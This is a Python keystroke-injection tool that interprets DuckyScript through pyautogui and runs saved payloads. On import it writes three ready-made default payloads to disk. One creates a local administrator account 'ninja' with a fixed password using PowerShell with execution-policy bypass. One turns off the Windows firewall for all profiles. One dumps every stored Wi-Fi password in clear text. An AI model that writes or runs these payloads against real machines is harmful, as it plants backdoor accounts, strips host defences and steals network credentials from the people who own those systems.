import time
import pyautogui
import os
import json

class DuckyScriptPayload:
    def __init__(self, name, content):
        self.name = name
        self.content = content

    def execute(self):
        lines = self.content.split('\n')
        for line in lines:
            self._execute_command(line.strip())

    def _execute_command(self, command):
        parts = command.split(' ', 1)
        cmd = parts[0].upper()
        arg = parts[1] if len(parts) > 1 else ''

        if cmd == 'DELAY':
            time.sleep(float(arg) / 1000)
        elif cmd == 'STRING':
            pyautogui.typewrite(arg)
        elif cmd == 'GUI':
            pyautogui.hotkey('win', arg.lower())
        elif cmd == 'ENTER':
            pyautogui.press('enter')
        # Add more command implementations as needed

def load_duckyscript_payload(name, content):
    return DuckyScriptPayload(name, content)

def list_duckyscript_payloads():
    payloads_dir = 'duckyscript_payloads'
    if not os.path.exists(payloads_dir):
        os.makedirs(payloads_dir)
    
    payloads = []
    for filename in os.listdir(payloads_dir):
        if filename.endswith('.txt'):
            payloads.append(filename[:-4])  # Remove .txt extension
    return payloads

def save_duckyscript_payload(name, content):
    payloads_dir = 'duckyscript_payloads'
    if not os.path.exists(payloads_dir):
        os.makedirs(payloads_dir)
    
    with open(os.path.join(payloads_dir, f"{name}.txt"), 'w') as f:
        f.write(content)

def execute_duckyscript_payload(payload_name):
    payloads_dir = 'duckyscript_payloads'
    payload_path = os.path.join(payloads_dir, f"{payload_name}.txt")
    
    if not os.path.exists(payload_path):
        return f"Payload '{payload_name}' not found"
    
    with open(payload_path, 'r') as f:
        content = f.read()
        payload = DuckyScriptPayload(payload_name, content)
        payload.execute()
    
    return f"Executed payload: {payload_name}"

def get_duckyscript_payload_content(payload_name):
    payloads_dir = 'duckyscript_payloads'
    payload_path = os.path.join(payloads_dir, f"{payload_name}.txt")
    
    if not os.path.exists(payload_path):
        return None
    
    with open(payload_path, 'r') as f:
        return f.read()

# Add some default DuckyScript payloads
default_payloads = {
    "add_admin_user": """
DELAY 1000
GUI r
DELAY 500
STRING powershell -ExecutionPolicy Bypass -Command "New-LocalUser -Name 'ninja' -Password (ConvertTo-SecureString 'Password123!' -AsPlainText -Force); Add-LocalGroupMember -Group 'Administrators' -Member 'ninja'"
ENTER
""",
    "disable_firewall": """
DELAY 1000
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 500
STRING netsh advfirewall set allprofiles state off
ENTER
""",
    "dump_wifi_passwords": """
DELAY 1000
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 500
STRING netsh wlan show profiles
ENTER
DELAY 500
STRING for /f "skip=9 tokens=1 delims=:" %i in ('netsh wlan show profiles') do netsh wlan show profile name=%i key=clear
ENTER
"""
}

# Create default payloads if they don't exist
for name, content in default_payloads.items():
    if not os.path.exists(os.path.join('duckyscript_payloads', f"{name}.txt")):
        save_duckyscript_payload(name, content)
